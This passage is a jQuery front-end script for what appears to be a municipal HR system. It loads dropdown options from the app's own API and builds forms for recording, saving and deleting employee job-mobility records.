$(document).ready(function () {
  let params = new URLSearchParams(location.search);
  id_funcionario = params.get("id_funcionario");
  if (id_funcionario != null) {
    getFuncionario(id_funcionario);
    getMovilidad(id_funcionario);
    $("#btnBuscar").attr("disabled", "disabled");
  } else cargar();

  $(document).on("click", ".delete_fun", function () {
    var opcion = confirm("Desea eliminar este usuario");
    if (opcion == true) {
      id_movilidad = $(this)
        .parents(".campos_movilidad")
        .find(".id_movilidad")
        .val();
      element = $(this).parents(".campos_movilidad");
      deleteMovilidad(id_movilidad, element);
    }
  });

  // id_movilidad = params.get('id_movilidad');
  // if (id_movilidad != null) {
  //   $('#id_movilidad').val(id_movilidad)
  //   getMovilidad(id_movilidad)
  // }

  $(document).on("click", ".btnExcel", function () {
    loadReporteEcxel();
  });
  $(document).on("click", ".btnPdf", function () {
    loadReportePDF();
  });
  $(document).on("click", ".btnMakeEditar", function () {
    $(this)
      .parents(".campos_movilidad")
      .find(".desactivar")
      .removeAttr("disabled");
  });

  $(document).on("click", ".btnMakeSaldoinicla", function () {
    var frm = $(this).parents("form:first").addClass("was-validated");
    invalid = $(frm).find(".form-control:invalid").length;
    if (invalid == 0) {
      $(this).html("GUARDAR").prop("disabled", true);
      datos_movilidad = $(this).parents(".campos_movilidad");
      guardarMovilidad(datos_movilidad);
    }
  });

  $(document).on("click", "#btnIrAtras", function () {
    location.href = "?view=consultas&mode=consultarmovilidad";
  });

  $(document).on("change", ".motivo", function () {
    if ($(this).val() != "Otro") {
      $(this)
        .parents(".campos_movilidad")
        .find(".cont_otro")
        .addClass("d-none");
      $(this).parents(".campos_movilidad").find(".otro").val("");
    } else $(this).parents(".campos_movilidad").find(".cont_otro").removeClass("d-none");
  });

  $(document).on("change", ".nivel_sel", function () {
    cargo($(this).val(), null, $(this).parents(".campos_movilidad"));
  });

  $(document).on("change", ".cargo_propiedad_sel", function () {
    CargarCodigo($(this).val(), null, $(this).parents(".campos_movilidad"));
  });

  $(document).on("change", ".codigo_sel", function () {
    CargarGrado($(this).val(), null, $(this).parents(".campos_movilidad"));
  });
  // $('input[name=emergencia]').click(function(){
  //   if(this.attr('checked')){
  //     var rrrr = this.parents('.td-table').sibling('.td-table:last-child').children('input[name=contacto_emergencia]');
  //   }else
  //    console.log('No chequeado')
  // })

  $("#btnBuscar").click(function () {
    cedula = $("#identificacion").val();
    getFuncionario();
    getMovilidad(null, cedula);
  });
});

function cargar() {
  vinculacion();
  // cargardependencia()
  cargarsede();
  CargarDependencia();
  CargarNivel();
}

function deleteMovilidad(id_movilidad, element) {
  $.post("set/movilidad/eliminar", {
    id_movilidad: id_movilidad,
  }).done(function (data) {
    data = JSON.parse(data);
    if (data.error != undefined) {
      console.log(atob(data.error));
      alertError(btoa("Error al eliminar la movilidad"));
    } else {
      alertSucces(data.success);
      $(element).remove();
    }
  });
}

$(document).on("change", ".fecha_ingreso_sel.border-required", function () {
  $(this)
    .parents(".campos_movilidad")
    .find(".ingreso")
    .val(new Date($(this).val()).getFullYear());
});

function guardarMovilidad(datos_guardar) {
  // data = Array();
  let fecha = new Date();
  let mes = fecha.getMonth() + 1;
  let dia = fecha.getDate();
  let ano = fecha.getFullYear();
  let fecha_creacion = ano + "-" + mes + "-" + dia;
  fecha_crea =
    $(datos_guardar).find(".fecha_creacion").val() == ""
      ? fecha_creacion
      : $(datos_guardar).find(".fecha_creacion").val();
  datos = new FormData();
  datos.append("id_movilidad", $(datos_guardar).find(".id_movilidad").val());
  datos.append(
    "tipo_vinculacion",
    $(datos_guardar).find(".tipo_vinculacion").val()
  );
  datos.append("fecha_ini", $(datos_guardar).find(".fecha_ingreso_sel").val());
  datos.append("ano_ingreso", $(datos_guardar).find(".ingreso").val());
  datos.append("nivel", $(datos_guardar).find(".nivel_sel").val());
  datos.append(
    "cargo_propiedad",
    $(datos_guardar).find(".cargo_propiedad_sel").val()
  );
  datos.append("codigo", $(datos_guardar).find(".codigo_sel").val());
  datos.append("grado", $(datos_guardar).find(".grado_sel").val());
  datos.append(
    "dependencia_mov",
    $(datos_guardar).find(".dependencia_sel").val()
  );
  datos.append("sede_mov", $(datos_guardar).find(".sede_sel").val());
  datos.append(
    "fecha_posesion",
    $(datos_guardar).find(".fecha_posesion").val()
  );
  datos.append("num_posesion", $(datos_guardar).find(".num_posesion").val());
  datos.append(
    "num_resolucion",
    $(datos_guardar).find(".num_resolucion").val()
  );
  datos.append(
    "fecha_resolucion",
    $(datos_guardar).find(".fecha_resolucion").val()
  );
  datos.append("modo_trabajo", $(datos_guardar).find(".modo_trabajo").val());
  datos.append(
    "archivo_lab",
    $(datos_guardar).find(".archivo_lab")[0].files[0]
  );
  datos.append("fecha_fin", $(datos_guardar).find(".fecha_fin").val());
  datos.append("salario", $(datos_guardar).find(".salario").val());
  datos.append("funciones", $(datos_guardar).find(".funciones").val());
  datos.append("motivo", $(datos_guardar).find(".motivo").val());
  datos.append("otro", $(datos_guardar).find(".otro").val());
  datos.append(
    "entrega_cargo",
    $(datos_guardar).find(".entrega_cargo:checked").val()
  );
  datos.append("fecha_creacion", fecha_crea);
  datos.append("id_funcionario", $("#id_funcionario").val());

  $.ajax({
    type: "POST",
    url: "set/movilidad/crear",
    data: datos,
    contentType: false,
    processData: false,
    success: function (data) {
      if (data.trim() !== "") {
        data = JSON.parse(data);
        if (data.error != undefined) {
          alertError(btoa("Error al crear la movilidad"));
          console.log(atob(data.error));
          return;
        }
        if (data.error_arc != undefined) {
          alertError(data.error_arc);
          // console.log(atob(data.error))
          return;
        }
        if (data.success != undefined) {
          /*$(`#razon,#abrev,#ident,#num_ident,#regimen,
            #ciudad,#dir,#telefono,#celular,#fax,
            #email,#observa,#banco,#tipo_cuenta,
            #num_cuenta`).val('')*/
          alertSucces(data.success);
        }
        // R_borrarDatos()
      }
    },

    // data.push(datos)
    // $.post('set/movilidad/crear', {
    //   general: JSON.stringify(datos)
    // }).done(function (data) {
    //   if (data.trim() !== '') {
    //     data = JSON.parse(data);
    //     // objMsjAJX.sel['msj'] = "#MsjAJX";
    //     if (data.error == undefined) {
    //       alertSucces(data.success)
    //       return
    //     }
    //     alertError(btoa('Error al crear la movilidad del funcionario'))
    //     console.log(atob(data.error))
    //   }
    // }).always(function () {
    //   $('#btnMakeSaldoinicla').html('<i class="fa fa-save"></i> GUARDAR').prop('disabled', false)
    //     .parents('form:first').removeClass('was-validated');

    // });
  });
}

function CargarNivel(id_nivel = null, cargado = null) {
  return new Promise(function (resolve, reject) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "https://app-jamundi.fksas.com/ajaxGeneral.php?mode=nivel");
    // xhr.open("POST", "http://jamundi.my/ajaxGeneral.php?mode=nivel");
    xhr.onload = function () {
      data = JSON.parse(xhr.responseText);
      let educa = '<option value="" selected>Seleccione...</option>';
      if (id_nivel != null) educa = '<option value="">Seleccione...</option>';
      $.each(data, function () {
        if (id_nivel == this.id_nivelfuncionario)
          educa += `<option selected value="${this.id_nivelfuncionario}">${this.nivel}</option>`;
        else
          educa += `<option value="${this.id_nivelfuncionario}">${this.nivel}</option>`;
        // $('.tipo_vinculacion').html(educa);
      });
      if (id_nivel != null || cargado != null) resolve(educa);
      // se accede con 'then()'
      else {
        $(".nivel_sel").html(educa);
      }
    };
    xhr.onerror = function () {
      reject(xhr.statusText); // se accede con 'catch()'
    };
    xhr.send();
  });
  // $.post('ajaxGeneral.php?mode=nivel')
  //   .done(function (data) {
  //     if (data.trim() !== '') {
  //       data = JSON.parse(data);
  //       // console.log(data);
  //       let nivel = '<option value="" selected>Seleccione...</option>';
  //       if (id_nivel != null)
  //         nivel = '<option value="">Seleccione...</option>';
  //       if (data.error != undefined) {
  //         alertError(data.error)
  //         return
  //       } else {
  //         $.each(data, function () {
  //           if (id_nivel == this.id_nivel)
  //             nivel += `<option selected value="${this.id_nivelfuncionario}">${this.nivel}</option>`;
  //           else
  //             nivel += `<option value="${this.id_nivelfuncionario}">${this.nivel}</option>`;
  //         });
  //         if (id_nivel != null)
  //           return nivel;
  //         $(".nivel_sel").html(nivel);
  //       }
  //     }
  //   })
}

function vinculacion(id_tipovinculacion = null, cargado = null) {
  return new Promise(function (resolve, reject) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "https://app-jamundi.fksas.com/ajaxGeneral.php?mode=Vinculacion");
    // xhr.open("POST", "http://jamundi.my/ajaxGeneral.php?mode=Vinculacion");
    xhr.onload = function () {
      data = JSON.parse(xhr.responseText);
      let educa = '<option value="" selected>Seleccione...</option>';
      if (id_tipovinculacion != null)
        educa = '<option value="">Seleccione...</option>';
      $.each(data, function () {
        if (id_tipovinculacion == this.id_tipovinculacion)
          educa += `<option selected value="${this.id_tipovinculacion}">${this.tipo_vinculacion}</option>`;
        else
          educa += `<option value="${this.id_tipovinculacion}">${this.tipo_vinculacion}</option>`;
        // $('.tipo_vinculacion').html(educa);
      });
      if (id_tipovinculacion != null || cargado != null) resolve(educa);
      // se accede con 'then()'
      else {
        $(".tipo_vinculacion").html(educa);
      }
    };
    xhr.onerror = function () {
      reject(xhr.statusText); // se accede con 'catch()'
    };
    xhr.send();
  });
  // $.post('ajaxGeneral.php?mode=Vinculacion')
  //   .done(function (data) {
  //     if (data.trim() !== '') {
  //       data = JSON.parse(data);
  //       // console.log(data);
  //       let educa = '<option value="" selected>Seleccione...</option>';
  //       if (id_tipovinculacion != null)
  //         educa = '<option value="">Seleccione...</option>';
  //       if (data.error != undefined) {
  //         alertError(data.error)
  //         return
  //       } else {
  //         $.each(data, function () {
  //           if (id_tipovinculacion == this.id_tipovinculacion)
  //             educa += `<option selected value="${this.id_tipovinculacion}">${this.tipo_vinculacion}</option>`;
  //           else
  //             educa += `<option value="${this.id_tipovinculacion}">${this.tipo_vinculacion}</option>`;
  //         });
  //         if (id_tipovinculacion != null)
  //           return educa;
  //         $('.tipo_vinculacion').html(educa);
  //       }
  //     }
  //   })
}

function cargo(nivel = null, id_cargo = null, elemento = null) {
  // nivel = $('#nivel').val();
  return new Promise(function (resolve, reject) {
    let xhr = new XMLHttpRequest();
    xhr.open(
      "POST",
      "https://app-jamundi.fksas.com/ajaxGeneral.php?mode=cargo&nivel_funcionario=" + nivel
      // "http://jamundi.my/ajaxGeneral.php?mode=cargo&nivel_funcionario=" + nivel
    );
    xhr.onload = function () {
      data = JSON.parse(xhr.responseText);
      let educa = '<option value="" selected>Seleccione...</option>';
      if (id_cargo != null) educa = '<option value="">Seleccione...</option>';
      $.each(data, function () {
        if (id_cargo == this.id_cargo)
          educa += `<option selected value="${this.id_cargo}">${this.cargo}</option>`;
        else educa += `<option value="${this.id_cargo}">${this.cargo}</option>`;
        // $('.tipo_vinculacion').html(educa);
      });
      if (elemento == null) resolve(educa);
      // se accede con 'then()'
      else {
        $(elemento).find(".cargo_propiedad_sel").html(educa);
      }
    };
    xhr.onerror = function () {
      reject(xhr.statusText); // se accede con 'catch()'
    };
    xhr.send();
  });
  // $.post('ajaxGeneral.php?mode=cargo', {
  //     nivel_funcionario: nivel
  //   })
  //   .done(function (data) {
  //     if (data.trim() !== '') {
  //       data = JSON.parse(data);
  //       // console.log(data);
  //       let cargo = '<option value="" selected>Seleccione...</option>';
  //       if (id_cargo != null)
  //         cargo = '<option value="">Seleccione...</option>';
  //       if (data.error != undefined) {
  //         alertError(data.error)
  //         return
  //       } else {
  //         $.each(data, function () {
  //           if (id_cargo == this.id_cargo)
  //             cargo += `<option selected value="${this.id_cargo}">${this.cargo}</option>`;
  //           else
  //             cargo += `<option value="${this.id_cargo}">${this.cargo}</option>`;
  //         });
  //         if (id_cargo != null)
  //           return cargo;
  //         $('.cargo_propiedad_sel').html(cargo);
  //       }

  //     }
  //   })
}

function CargarCodigo(id_cargo, id_codigo = null, elemento = null) {
  return new Promise(function (resolve, reject) {
    let xhr = new XMLHttpRequest();
    xhr.open(
      "POST",
      "https://app-jamundi.fksas.com/ajaxGeneral.php?mode=codigo&cargo=" + id_cargo
      // "http://jamundi.my/ajaxGeneral.php?mode=codigo&cargo=" + id_cargo
    );
    xhr.onload = function () {
      data = JSON.parse(xhr.responseText);
      let educa = '<option value="" selected>Seleccione...</option>';
      if (id_codigo != null) educa = '<option value="">Seleccione...</option>';
      $.each(data, function () {
        if (id_codigo == this.id_codigo)
          educa += `<option selected value="${this.id_codigo}">${this.codigo}</option>`;
        else
          educa += `<option value="${this.id_codigo}">${this.codigo}</option>`;
        // $('.tipo_vinculacion').html(educa);
      });
      if (elemento == null) resolve(educa);
      // se accede con 'then()'
      else {
        $(elemento).find(".codigo_sel").html(educa);
      }
    };
    xhr.onerror = function () {
      reject(xhr.statusText); // se accede con 'catch()'
    };
    xhr.send();
  });
  // $.post('ajaxGeneral.php?mode=codigo', {
  //     cargo: id_cargo
  //   })
  //   .done(function (data) {
  //     if (data.trim() !== '') {
  //       data = JSON.parse(data);
  //       // console.log(data);
  //       let codigo = '<option value="" selected>Seleccione...</option>';
  //       if (id_codigo != null)
  //         codigo = '<option value="">Seleccione...</option>';
  //       if (data.error != undefined) {
  //         alertError(data.error)
  //         return
  //       } else {
  //         $.each(data, function () {
  //           if (id_codigo == this.id_codigo)
  //             codigo += `<option selected value="${this.id_codigo}">${this.codigo}</option>`;
  //           else
  //             codigo += `<option value="${this.id_codigo}">${this.codigo}</option>`;
  //         });
  //         if (id_codigo != null)
  //           return codigo;
  //         $('.codigo_sel').html(codigo);
  //       }
  //     }
  //   })
}

function CargarGrado(id_codigo, id_grado = null, elemento) {
  return new Promise(function (resolve, reject) {
    let xhr = new XMLHttpRequest();
    xhr.open(
      "POST",
      "https://app-jamundi.fksas.com/ajaxGeneral.php?mode=grado&codigo=" + id_codigo
      // "http://jamundi.my/ajaxGeneral.php?mode=grado&codigo=" + id_codigo
    );
    xhr.onload = function () {
      data = JSON.parse(xhr.responseText);
      let educa = '<option value="" selected>Seleccione...</option>';
      if (id_grado != null) educa = '<option value="">Seleccione...</option>';
      $.each(data, function () {
        if (id_grado == this.id_grado)
          educa += `<option selected value="${this.id_grado}">${this.grado}</option>`;
        else educa += `<option value="${this.id_grado}">${this.grado}</option>`;
        // $('.tipo_vinculacion').html(educa);
      });
      if (elemento == null) resolve(educa);
      // se accede con 'then()'
      else {
        $(elemento).find(".grado_sel").html(educa);
      }
    };
    xhr.onerror = function () {
      reject(xhr.statusText); // se accede con 'catch()'
    };
    xhr.send();
  });
  // $.post('ajaxGeneral.php?mode=grado', {
  //     codigo: id_codigo
  //   })
  //   .done(function (data) {
  //     if (data.trim() !== '') {
  //       data = JSON.parse(data);
  //       // console.log(data);
  //       let grado = '<option value="" selected>Seleccione...</option>';
  //       if (id_grado != null)
  //         grado = '<option value="">Seleccione...</option>';
  //       if (data.error != undefined) {
  //         alertError(data.error)
  //         return
  //       } else {
  //         $.each(data, function () {
  //           if (id_grado == this.id_grado)
  //             grado += `<option selected value="${this.id_grado}">${this.grado}</option>`;
  //           else
  //             grado += `<option value="${this.id_grado}">${this.grado}</option>`;
  //         });
  //         if (id_grado != null)
  //           return grado
  //         $('.grado_sel').html(grado);
  //       }
  //     }
  //   })
}

function CargarDependencia(id_dependencia = null, cargado = null) {
  return new Promise(function (resolve, reject) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "https://app-jamundi.fksas.com/ajaxGeneral.php?mode=dependencia");
    // xhr.open("POST", "http://jamundi.my/ajaxGeneral.php?mode=dependencia");
    xhr.onload = function () {
      data = JSON.parse(xhr.responseText);
      let educa = '<option value="" selected>Seleccione...</option>';
      if (id_dependencia != null)
        educa = '<option value="">Seleccione...</option>';
      $.each(data, function () {
        if (id_dependencia == this.id_dependencia)
          educa += `<option selected value="${this.id_dependencia}">${this.dependencia}</option>`;
        else
          educa += `<option value="${this.id_dependencia}">${this.dependencia}</option>`;
        // $('.tipo_vinculacion').html(educa);
      });
      if (id_dependencia != null || cargado != null) resolve(educa);
      // se accede con 'then()'
      else {
        $(".dependencia_sel").html(educa);
      }
    };
    xhr.onerror = function () {
      reject(xhr.statusText); // se accede con 'catch()'
    };
    xhr.send();
  });
  // $.post('ajaxGeneral.php?mode=dependencia')
  //   .done(function (data) {
  //     if (data.trim() !== '') {
  //       data = JSON.parse(data);
  //       // console.log(data);
  //       let dependencia = '<option value="" selected>Seleccione...</option>';
  //       if (id_dependencia != null)
  //         dependencia = '<option value="">Seleccione...</option>';
  //       if (data.error != undefined) {
  //         alertError(data.error)
  //         return
  //       } else {
  //         $.each(data, function () {
  //           if (id_dependencia == this.id_dependencia)
  //             dependencia += `<option value="${this.id_dependencia}" selected>${this.dependencia}</option>`;
  //           else
  //             dependencia += `<option value="${this.id_dependencia}">${this.dependencia}</option>`;
  //         });
  //         if (id_dependencia != null)
  //           return dependencia;
  //         $('.dependencia_sel').html(dependencia);
  //       }
  //     }
  //   })
}

function getFuncionario(id_funcionario = "") {
  $.post("ajaxGeneral.php?mode=getFuncionario_2", {
    documento: $("#identificacion").val(),
    id_funcionario: id_funcionario,
  }).done(function (data) {
    if (data.trim() !== "") {
      data = JSON.parse(data);
      if (data.error == undefined) {
        $(data).each(function () {
          $("#id_funcionario").val(this.id_funcionario);
          $("#identificacion").val(this.documento);
          $("#nombres").val(this.nombre);
          $("#apellidos").val(this.apellidos);
          $("#vinculacion").val(this.tipo_vinculacion);
          $("#fecha_ingreso").val(this.fecha_ingreso_nombra);
          $("#cargo_propiedad").val(this.cargo);
          $("#years").val(this.ano_ingreso);
          $("#nivel").val(this.nivel);
          $("#codigo").val(this.codigo);
          $("#grado").val(this.grado);
          $("#Dependencia").val(this.dependencia);
          $("#sede").val(this.sede);
          $("#cargo").val(this.cargo);
          $("input[name=procesos_disc]")
            .filter("[value=" + this.is_procesodisciplinario + "]")
            .attr("checked", true);
          $(".tipo_vinculacion").val("");
          $(".fecha_ingreso_sel").val("");
          $(".ingreso").val("");
          $(".nivel_sel").val("");
          $(".cargo_propiedad_sel").val("");
          $(".codigo_sel").val("");
          $(".grado_sel").val("");
          $(".dependencia_sel").val("");
          $(".sede_sel").val("");
          $(".num_posesion").val("");
          $(".fecha_posesion").val("");
          $(".num_resolucion").val("");
          $(".fecha_resolucion").val("");
          $(".fecha_fin").val("");
          $(".modo_trabajo").val("");
          $(".salario").val("");
          $(".archivo_lab").val("");
          $(".funciones").val("");
        });
        // if(id_funcionario == '')
        // cargar()
        $("#ubicacion_lab").removeClass("d-none");
      } else {
        $("#id_funcionario").val("");
        $("#identificacion").val("");
        $("#nombres").val("");
        $("#apellidos").val("");
        $("#vinculacion").val("");
        $("#fecha_ingreso").val("");
        $("#years").val("");
        $("#nivel").val("");
        $("#cargo_propiedad").val("");
        $("#codigo").val("");
        $("#grado").val("");
        $("#Dependencia").val("");
        $("#sede").val("");
        $("#cargo").val("");
        $(".tipo_vinculacion").val("");
        $(".fecha_ingreso_sel").val("");
        $(".ingreso").val("");
        $(".nivel_sel").val("");
        $(".cargo_propiedad_sel").val("");
        $(".codigo_sel").val("");
        $(".grado_sel").val("");
        $(".dependencia_sel").val("");
        $(".sede_sel").val("");
        $(".num_posesion").val("");
        $(".fecha_posesion").val("");
        $(".num_resolucion").val("");
        $(".fecha_resolucion").val("");
        $(".fecha_fin").val("");
        $(".modo_trabajo").val("");
        $(".salario").val("");
        $(".archivo_lab").val("");
        $(".funciones").val("");
        $("input[name=procesos_disc]").attr("checked", false);
        $(".ubicacion_lab").addClass("d-none");
      }
    }
  });
}

function getMovilidad(id_funcionario = null, cedula = null) {
  mov = "";
  // vinculaciones = Array(),
  (niveles = Array()),
    (cargos = Array()),
    (codigos = Array()),
    (grados = Array()),
    (dependencias = Array()),
    (sedes = Array());
  $.post("ajaxGeneral.php?mode=getMovilidad1_2", {
    id_funcionario: id_funcionario,
    cedula: cedula,
  }).done(async function (data) {
    let fecha = new Date();
    let mes = fecha.getMonth() + 1;
    let dia = fecha.getDate();
    let ano = fecha.getFullYear();
    let fecha_creacion = ano + "-" + mes + "-" + dia;
    if (data.trim() !== "") {
      data = JSON.parse(data);
      // console.log(data);
      let codigo = '<option value="" selected disabled>Seleccione...</option>';
      if (data.error != undefined) {
        i = 1;
        movi = `<form action="" class="mb-3">
      <div class="campos_movilidad">
          <input type="hidden" class="id_movilidad" value="">
          <div class="row padding-secciones">
            <div class="col-md-3 mb-2">
              <label class="label-form" for="tipo_vinculacion">Tipo de vinculación <span style="color: red;">*</span></label>
              <select class="form-control input-form color-t border-required tipo_vinculacion" placeholder='' required="">
              ${await vinculacion(null, 1)}
              </select>
              <div class="invalid-feedback">
                Debe seleccionar el Tipo de vinculación
              </div>
            </div>
            <div class="col-md-3">
              <label for="fecha_ingreso_sel" class="label-form">Fecha de Novedad </label>
              <input type="date" class="form-control input-form color-t disabled border-required fecha_ingreso_sel">
              <div class="invalid-feedback">Debe seleccionar la fecha.</div>
            </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="ingreso">Año de ingreso <span style="color: red;">*</span></label>
              <input type="text" class="form-control input-form color-t border-required ingreso year_ingreso" disabled name="ingreso" placeholder="Año de ingreso..." maxlength="255" value="" required="">
            </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="nivel_select">Nivel <span style="color: red;">*</span></label>
              <select class="form-control input-form color-t border-required nivel_sel" placeholder='Nivel educativo...' required="">
              ${await CargarNivel(null, 1)}
              </select>
              <div class="invalid-feedback">
                Debe seleccionar el Nivel
              </div>
            </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="cargo_propiedad_sel">Denominacion del Empleo <span style="color: red;">*</span></label>
              <select class="form-control input-form color-t border-required cargo_propiedad_sel" placeholder='Cargo en propiedad educativo...' required="">
                <option value="" selected disabled>Seleccione...</option>
              </select>
              <div class="invalid-feedback">
                Debe seleccionar el Cargo en propiedad
              </div>
            </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="codigo">Codigo <span style="color: red;">*</span></label>
              <select class="form-control input-form color-t border-required codigo_sel" placeholder='Cargo...' required="">
                <option value="" selected disabled>Seleccione...</option>
              </select>
              <div class="invalid-feedback">
                Debe seleccionar el Codigo
              </div>
            </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="grado">Grado <span style="color: red;">*</span></label>
              <select class="form-control input-form color-t border-required grado_sel" placeholder='Cargo...' required="">
                <option value="" selected disabled>Seleccione...</option>
              </select>
              <div class="invalid-feedback">
                Debe seleccionar el grado
              </div>
            </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="num_posesion">N° de Acto Administrativo </label>
              <input type="text" class="form-control input-form color-t border-required num_posesion" name="num_posesion" placeholder="Posesión..." maxlength="255" value="">
              <div class="invalid-feedback">
                Son permitidos un maximo de 11 numeros
              </div>
            </div>
            <div class="col-md-3 mb-2">
            <label class="label-form" for="fecha_resolucion">Fecha de Acto Administrativo </label>
            <input type="date" class="form-control input-form color-t border-required fecha_resolucion" name="fecha_resolucion" maxlength="255" value="">
            <div class="invalid-feedback">
              Este campo es obligatorio
            </div>
          </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="num_resolucion">N° de Acta de Posicionamiento<span style="color: red;">*</span></label>
              <input type="number" max="99999999999" class="form-control input-form color-t border-required num_resolucion" name="num_resolucion" placeholder="Resolución..." maxlength="255" value="" required="">
              <div class="invalid-feedback">
                Son permitido un maximo de 11 numeros
              </div>
            </div>
            <div class="col-md-3 mb-2">
            <label class="label-form" for="fecha_posesion">Fecha de Posesión</label>
            <input type="date" class="form-control input-form color-t border-required fecha_posesion" name="fecha_posesion" placeholder="Ingrese el Cargo..." maxlength="255" value="">
            <div class="invalid-feedback">
              Este campo es obligatorio
            </div>
          </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="fecha_fin">Fecha Finalización </label>
              <input type="date" class="form-control input-form color-t border-required fecha_fin" name="fecha_fin" maxlength="255" value="" placeholder="Fecha Final">
              <div class="invalid-feedback">
                Este campo es requerido
              </div>
            </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="">Sede <span style="color: red;">*</span></label>
              <select class="form-control input-form color-t border-required sede_sel" placeholder='Cargo...' required="">
              ${await cargarsede(null, 1)}
              </select>
              <div class="invalid-feedback">
                Debe seleccionar este campo
              </div>
            </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="">Dependencia <span style="color: red;">*</span></label>
              <select class="form-control input-form color-t border-required dependencia_sel" placeholder='...' required="">
              ${await CargarDependencia(null, 1)}
              </select>
              <div class="invalid-feedback">
                Debe seleccionar este campo
              </div>
            </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="">Motivo <span style="color: red;">*</span></label>
              <select class="form-control input-form color-t border-required motivo" placeholder='Cargo...' required="">
                <option value="" selected disabled>Seleccione...</option>
                <option value="Encargo">Encargo</option>
                <option value="Reubicacion">Reubicacion</option>
                <option value="Comision">Comisión</option>
                <option value="Otro">Otro</option>
              </select>
              <div class="invalid-feedback">
                Debe seleccionar este campo
              </div>
            </div>
            <div class="col-md-3 d-none mb-2 cont_otro">
              <label class="label-form" for="">Cual? <span style="color: red;">*</span></label>
              <input type="text" class="form-control input-form color-t border-required otro" name="otro" placeholder="cual..." maxlength="255" value="">
            </div>
            <div class="col-md-3">
                <label for="sexo" class="label-form">Requiere Entrega del cargo</label>
                <div class="form-inline">
                  <div class="custom-control custom-radio pr-3">
                    <label class="custom-control-label label-form" for="si_procesos">Si</label>
                    <input type="radio" class="custom-control-input si_procesos desactivar entrega_cargo" name="procesos_disc${i}" value="SI">
                    <label class="custom-control-label label-form" for="no_procesos">No</label>
                    <input type="radio" class="custom-control-input no_procesos desactivar entrega_cargo" name="procesos_disc${i}" value="NO">
                    <div class="invalid-feedback">
                      Esta opción es requerida
                    </div>
                  </div>
                </div>
              </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="modo_trabajo">Modalidad de Trabajo <span style="color: red;">*</span></label>
              <select class="form-control input-form color-t border-required modo_trabajo" placeholder='Cargo...' required="">
                <option value="" selected disabled>Seleccione...</option>
                <option value="Presencial">Presencial</option>
                <option value="Teletrabajo">Teletrabajo</option>
                <option value="Alternancia">Alternancia</option>
              </select>
              <div class="invalid-feedback">
                Debe seleccionar este campo
              </div>
            </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="salario">Salario <span style="color: red;">*</span></label>
              <input type="number" class="form-control input-form color-t border-required salario" name="salario" maxlength="255" value="" required="" placeholder="Salario">
              <div class="invalid-feedback">
                Este campo es requerido
              </div>
            </div>
            <div class="col-md-3 mb-2">
              <label class="label-form" for="funciones">Seleccione un archivo</label>
              <input type="file" class="form-control input-form color-t border-required archivo_lab" name="archivo_lab" maxlength="255" value="" ">
            <div class=" invalid-feedback">
              Este campo es obligatorio
            </div>
          </div>
          <div class="col-md-6 mb-2">
            <label class="label-form" for="funciones">Funciones <span style="color: red;">*</span></label>
            <textarea type="text" class="form-control input-form color-t border-required funciones" name="funciones" maxlength="255" value="" required="" placeholder="Funciones"></textarea>
            <div class="invalid-feedback">
              Este campo es requerido
            </div>
          </div>
          <div class="col-md-3 mb-2">
            <label class="label-form" for="fecha_creacion">Fecha Creación </label>
            <input type="date" disabled class="form-control input-form color-t border-required fecha_creacion" value="${fecha_creacion}" name="fecha_creacion" maxlength="255" value="" placeholder="Fecha Final">
            <div class="invalid-feedback">
              Este campo es requerido
            </div>
          </div>
          <div class="col-md-12 mt-3" style="flex-direction: row-reverse" id="btns">
          <button class="btn color-button btnMakeSaldoinicla" style="float:right" type="button"> <i class="fa fa-save"></i> GUARDAR</button>
          </div>
        </div></form>`;
        $("#movilidades").html(movi);
        // alert(data.error);
        // $('#id_funcionario').val('')
        // $('#identificacion').val('')
        // $('#nombres').val('')
        // $('#apellidos').val('')
        // $('#vinculacion').val('')
        // $('#fecha_ingreso').val('')
        // $('#years').val('')
        // $('#nivel').val('')
        // $('#cargo_propiedad').val('')
        // $('#codigo').val('')
        // $('#grado').val('')
        // $('#Dependencia').val('')
        // $('#sede').val('')
        // $('#cargo').val('')
        $(".tipo_vinculacion").val("");
        $(".fecha_ingreso_sel").val("");
        $(".ingreso").val("");
        $(".nivel_sel").val("");
        $(".cargo_propiedad_sel").val("");
        $(".codigo_sel").val("");
        $(".grado_sel").val("");
        $(".dependencia_sel").val("");
        $(".sede_sel").val("");
        $(".num_posesion").val("");
        $(".fecha_posesion").val("");
        $(".num_resolucion").val("");
        $(".fecha_resolucion").val("");
        $(".fecha_fin").val("");
        $(".modo_trabajo").val("");
        $(".salario").val("");
        $(".archivo_lab").val("");
        $(".funciones").val("");
        return;
      }
      $("#movilidades").html("");
      // $.each(data, async function () {
      // vinculaciones = await vinculacion(this.id_tipovinculacion);
      // niveles = await CargarNivel(this.id_nivel)
      // cargos = await cargo(this.id_nivel, this.id_cargo)
      // codigos = await CargarCodigo(this.id_cargo, this.id_codigo)
      // grados = await CargarGrado(this.id_codigo, this.id_grado)
      // dependencias = await CargarDependencia(this.id_dependencia);
      // sedes = await cargarsede(this.id_sede)
      // $('#id_funcionario').val(this.id_funcionario)
      // $('.fecha_ingreso_sel').val(this.fecha_ini)
      // $('.ingreso').val(new Date(this.fecha_ini).getFullYear())
      // await cargadoDatos(this, vinculaciones, niveles, cargos, codigos, grados, dependencias, sedes);
      (async function () {
        for (i = 0; i < data.length; i++) {
          years = new Date(data[i]["fecha_ini"]).getFullYear();
          mov = `<form action="" class="mb-3">
      <div class="campos_movilidad">
              <input type="hidden" class="id_movilidad" value="${
                data[i]["id_movilidad"]
              }">
              <div class="row padding-secciones">
              <div class="col-md-12 mt-3" style="" id="btns">
                <!-- <button class="btn btn-danger btn-sm desactivar delete_fun" disabled style="float:right; margin: 0 15px;" type="button"> <i class="fa fa-save"></i> ELIMINAR</button>
